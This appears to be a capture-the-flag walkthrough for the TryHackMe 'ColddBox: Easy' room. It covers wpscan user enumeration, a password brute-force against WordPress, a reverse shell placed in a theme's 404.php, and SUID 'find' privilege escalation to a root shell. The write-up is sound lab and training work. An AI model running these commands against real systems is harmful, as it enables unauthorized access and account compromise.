# ColddBox: Easy CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **ColddBox: Easy** CTF challenge on [TryHackMe](https://tryhackme.com/room/colddboxeasy). 
---

we see open ports 80 and 4512

![scn](imgs/scn.png "scn")

from main page we see that there is a wordpress

![mm](imgs/mm.png "mm")

wordpress login page

![lg](imgs/lg.png "lg")

we can use wpscan to enumerate users

```
wpscan --url http://$IP:80 -v --no-update --enumerate vp,u
```

![us](imgs/us.png "us")

we found users: hugo, philip, c0ldd

now we can try to brute-force the login using wpscan

```
wpscan --url http://$IP -v --usernames c0ldd --passwords /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt --no-update
```

![pp](imgs/pp.png "pp")

it worked we found valid password

![ds](imgs/ds.png "ds")

now we can upload our reverse shell code to some 404.php and access it `http://10.10.X.X/wp-content/themes/twentyfifteen/404.php`

![4](imgs/4.png "4")

we have access as `www-data`

![www](imgs/www.png "www")

here we can see some hidden note

![hf](imgs/hf.png "hf")

running linpeas we can see the SUID for /usr/bin/find we can try to run a command suggested by GTFObins

![sd](imgs/sd.png "sd")

![gt](imgs/gt.png "gt")

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

now we have root access we can grab user flag

![use](imgs/use.png "use")

and root flag

![rt](imgs/rt.png "rt")

# MACHINE PWNED
